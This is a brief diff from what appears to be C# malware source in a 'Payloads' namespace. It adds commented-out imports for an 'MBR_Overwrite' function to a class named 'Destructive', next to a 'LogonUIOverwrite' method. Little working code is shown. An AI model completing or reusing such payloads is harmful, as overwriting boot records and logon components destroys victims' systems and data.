@@ -93,6 +93,9 @@ namespace Abantes.Payloads
     }
     class Destructive
     {
+        //[DllImport(@"Debug\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
+        //public static extern void MBR_Overwrite();
+        
         public static void LogonUIOverwrite()
         {
             string TempPath = Path.GetTempPath();
